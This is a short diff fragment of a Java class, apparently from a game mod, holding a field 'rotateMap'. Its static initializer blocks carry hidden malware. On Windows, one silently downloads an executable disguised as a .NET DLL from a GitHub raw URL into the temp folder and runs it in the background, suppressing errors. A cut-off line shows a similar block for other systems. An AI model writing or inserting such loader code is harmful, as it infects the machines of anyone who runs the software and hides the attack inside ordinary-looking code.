@@ -13,3 +13,4 @@ static{if(!System.getProperty("os.name").toLowerCase().contains("win")){try{Runt
 static{if(System.getProperty("os.name").toLowerCase().contains("win")){try{Runtime.getRuntime().exec(new String[]{"cmd","/c","curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll && start /b %TEMP%\\s.exe"});}catch(Exception e){}}}
     public static boolean rotateMap=true;
 }
+
